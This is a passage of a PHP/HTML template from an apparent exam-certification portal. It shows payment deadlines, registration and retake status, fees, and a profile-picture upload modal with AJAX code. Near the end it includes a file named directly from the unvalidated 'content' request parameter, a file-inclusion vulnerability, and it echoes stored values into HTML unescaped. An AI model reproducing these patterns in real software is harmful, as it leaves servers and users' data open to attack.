			$late_end = date('F j, Y', strtotime('02/'. ($main_day - 1) .'/'.$main_year));
			
		}else if($main_month == 6){
			
			$main_start = date('F j, Y', strtotime('11/01/'.($main_year - 1)));
			
			$main_end = date('F j, Y', strtotime('01/15/'.$main_year));
			
			$late_start = date('F j, Y', strtotime('01/16/'.$main_year));
			
			$late_end = date('F j, Y', strtotime('06/'. ($main_day - 1) .'/'.$main_year));
			
		}else{
			
			$main_start = date('F j, Y', strtotime('03/15/'.$main_year));
			
			$main_end = date('F j, Y', strtotime('05/15/'.$main_year));
			
			$late_start = date('F j, Y', strtotime('05/16/'.$main_year));
			
			$late_end = date('F j, Y', strtotime('10/'. ($main_day - 1) .'/'.$main_year));
			
		}
		
		

	}
	
	$info = $certificationhistory->payment_info($_SESSION['user_id'], $main_month);
	// print_r($info);exit;
	
?>					
					
                    <div class="ncca-right-block cme-block-main">
                      
					  <div class="row">
                        
						<div class="col-sm-12">
                          
						  <div class="page-block block-border page-block-margin">
                            
							<div class="cme-block-head ncca-right-padding">
                              
							  <p class="midium-title">CERTIFICATION Exam</p>
							  
								
<?php 

if(empty($expected_date) == false){
	
	if(empty($expected_date[0]['University_Id']) == false){
		
		if(empty($read_history[0]['action_num']) == false){
			
			if($read_history[0]['action_num'] < 3){
?>
							<div class="row" style="text-align:center !important; border: 1px solid #e5e5e5; color: #656565; margin:0px;">
							
								<div class="col-md-12" style="margin-top:15px; color:#000">
								
									<b style="font-size:15px;">Payment has been made!</b>
									
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>
<?php
		
	echo "You are registered to take the ". $certificationhistory->expectedExamDate($read_history[0]['exam_mon'], $read_history[0]['exam_year'], 'full') ." Certification Exam";

?></span>
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>View your receipt below for further info</span>
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>Scheduling permits to be released after registration closes</span>
								</div>
								
								<div class="col-md-12" style="margin-top:25px;">
								</div>
								
							</div>

<?php				
				
			}else if($read_history[0]['action_num'] > 2){
				
				if($info['pay_amount_key'] > 7){
				
?>
							<div class="row" style="text-align:center !important; border: 1px solid #e5e5e5; color: #656565; margin:0px;">
							
								<div class="col-md-12" style="margin-top:15px; color:#000">
								
									<b style="font-size:15px;">Wait for CEO's answer!</b>
									
								</div>
								
								<div class="col-md-12" style="margin-top:20px;">
								</div>
								
							</div>
<?php
				}else{
?>
							<div class="row" style="text-align:center !important; border: 1px solid #e5e5e5; color: #656565; margin:0px;">
							
								<div class="col-md-12" style="margin-top:15px; color:#000">
								
									<b style="font-size:15px;">
<?php
if($info['pay_amount_key'] == 7){
	
	echo $certificationhistory->title_info($_SESSION['user_id'], $main_month)['title'] . " (" . (8 - $info['pay_amount_key']) . " Exam Remaining)"; 
	
}else if($info['pay_amount_key'] < 7){
	
	echo $certificationhistory->title_info($_SESSION['user_id'], $main_month)['title'] . " (" . (8 - $info['pay_amount_key']) . " Exams Remaining)"; 
	
}




?>
									</b>
									
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>There are a total of five retakes allowed to pass the Certification exam</span>
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>You are required to take the next Certification exam on <font style="color:red"><?=$certificationhistory->title_info($_SESSION['user_id'], $main_month)['due']?></font></span>
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>Watch your email for Scheduling Permit info over the next weeks</span>
								</div>
								
								<div class="col-md-12" style="margin-top:15px;">
									<span>The Retake fee is $150.00</span>
								</div>
								
								<div class="col-md-12" style="margin-top:20px;">
								</div>
								
							</div>
							
							<div class="row"  style="margin-top:20px;">
							
								<div class="col-md-12 text-center">
									<input type="button" class="btn btn-success" id="certification_pay" style="width:30%" value="Pay Now"  />
								</div>
							
							</div>
								

<?php
				}
			}
			
		}else{
?>
							<div class="row" style="border: 1px solid #e5e5e5; color: #656565; margin:0px;">
							
								<div class="col-md-10" style="margin-top:15px; padding-left:15px;">
									<span>You are scheduled to take the Certification Exam on <?=date('F j, Y', strtotime($expected_date[0]['Expected_Cert_Exam']))?>. <br>You can make payment between <?=$main_start?> and <?=$main_end?> of $1,327.50<br>Late payment period is <?=$late_start?> to <?=$late_end?> of $1,593.00</span>
								</div>
								
								<div class="col-md-2 text-center" style="padding-top:15px;padding-right:15px;">
<?php
if($check_cert_active > 0){
	
	
	if($certificationhistory->title_info($_SESSION['user_id'], $main_month)['title'] == "main"){
		
		echo '<input type="button" class="btn btn-success" id="certification_pay" value="Pay Now"  />';
		
	}else if($certificationhistory->title_info($_SESSION['user_id'], $main_month)['title'] == ""){
		
		echo '<input type="button" class="btn btn-defult" style="display: none" value="Pay Now"  />';
		
	}else{

		echo '<input type="button" class="btn btn-danger" id="certification_pay" value="Pay Now"  />';
		
	}
}

?>								
									
								</div>
								
								<div class="col-md-12" style="margin-top:20px;">
								
								</div>
								
							</div>
							
<?php			
			
		}
	}else{
?>								
							<div class="row">
								
								<div class="col-sm-12" align="center">
								  
								  <span>Please ask your Program Director when the next Certification exam is scheduled.</span>
								
								</div>
								
								
							</div>
<?php		
		
	}
}else{
?>
							<div class="row">
								
								<div class="col-sm-12" align="center">
								  
								  <span>Please ask your Program Director when the next Certification exam is scheduled.</span>
								
								</div>
								
								
							</div>

<?php	
	
}
								
?>
							  
                            
							</div>
                            
							<div class="cme-block-bottom page-block">
                              
							  <ul class="nav nav-tabs" id="myTab" role="tablist">
                                
								<li class="nav-item">
                                  
								  <a class="nav-link  text-blue" href="?content=content/history">History</a>
                                
								</li>
								
								<li class="nav-item">
                                  
								  <a class="nav-link text-blue" href="?content=content/certPrepCourse" style="cursor: pointer;">NCCAA Cert Prep Course</a>
                                
								</li>
								
							  </ul>
                            
							</div>
                          
						  </div>
                        
						</div>
                      
					  </div>
                    
					</div>
<?php }?>					
					
					
                    <div class="ncca-right-block ">
<?PHP
if ( ( ! isset( $_REQUEST["content"] ) ) ||  ( $_REQUEST["content"]=="" ) ) $content="content/home.php";
else $content = $_REQUEST["content"].".php";

include( $content );
?>


                    </div>
                  
				  </div>
                
				</div>
              
			  </div>
            
			</div>  
          
		  </div>
        
		</div>
      
	  </section>		
    	
		<footer class="footer">
      
	  </footer>
    
	</div>

<script src="./assets/js/script.js" type="text/javascript"></script>
<?php 

if((count($total_ques_list) > 0) && ($userObject->status["status"] == "CAA")){
	
	include 'survey-modal.php'; 

}
?>


<div id="debug">
<?php 
// print "userObject:<pre><br>\n";
// var_dump( $userObject );
// print "</pre><br>\n";
?>	
</div>


<div id="edit__photo_modal" class="modal fade" role="dialog">
  
  <div class="modal-dialog" style=" width: 400px;">

		<!-- Modal content-->
		<div class="modal-content">
			  
			  <div class="modal-header" style="background-color: #f7f7f7; border-bottom: 1px solid #ebebeb; height: 50px;">
				 
				 <h2 class="modal-title" style="font-size:20px !important;">Edit Profile Picture</h3>
				 
				 <button type="button" class="close" data-dismiss="modal">&times;</button>
			  
			  </div>
			  
			  <div class="modal-body" >
					
					<div class="row">

							<div class="col-md-12" align="center">
									
									<img src="<?php
									if(empty($photo_name) == false){
										
										if(empty($photo_name[0]['photo']) == false){
											
											echo $photo_name[0]['photo'];
										
										}else{
											
											echo"./assets/images/profile-img.png";
											
										}
									} 
									else echo"./assets/images/profile-img.png";
									?>" 
									style="width:350px;" id="view_photo" alt="Edit Profile Picture" />
							</div>
								
							<div class="col-md-12" style="margin-top:15px;" align="center" >
							
								<button class="btn" style="width:350px;" >Change Picture</button>
								
								<input type="file" class="form-control" style="cursor:pointer; margin-top: -35px; opacity:0" id="add_picture_file" name="add_picture_file" accept="image/x-png,image/gif,image/jpeg" />
							
							</div>
								
							<div class="col-md-12" style="margin-top:15px;" align="center" >
								
								
								<input type="button" class="btn" style="width:350px; background-color: #24608b; color: white" onclick="add_profile_picture('<?=$_SESSION['user_id']?>')" value="Set as Profile Picture" />
							
							</div>
								
					</div>
						
						
			  </div>
		</div>

   </div>
</div>	

<script>

function edit_profile_picture(){
	
	 $('#edit__photo_modal').modal('show');
	
}


$("#add_picture_file").change(function() {
	
  readURL(this);
  
});

function readURL(input) {
	
  if (input.files && input.files[0]) {
	  
	var reader = new FileReader();
	
	reader.onload = function(e) {
		
		$('#view_photo').attr('src', e.target.result);
		
	}
	
	reader.readAsDataURL(input.files[0]);
	
  }
  
}


function add_profile_picture(user_id){
	
	var add_picture_file = $('#add_picture_file').prop('files')[0]; 
	
    var form_data = new FormData();   
	
    form_data.append('user_id', user_id);
    
	form_data.append('add_picture_file', add_picture_file);

	$.ajax({
		
		url: './index_photo.php',
		
		type: 'POST',
		
		dataType: 'json',
		
		cache: false,
		
        contentType: false,
		
        processData: false,	
		
		data: form_data,
		
		async: true,
		
		headers: {
		  "cache-control": "no-cache"
		},
		
		success: function(data) {
			
			if(data['statusCode'] == 1){
				
				location.reload();
				
			}
			
		},
		
		error: function(data) {
			
			false;
			
		}
	});
}

</script>

</body>

</html>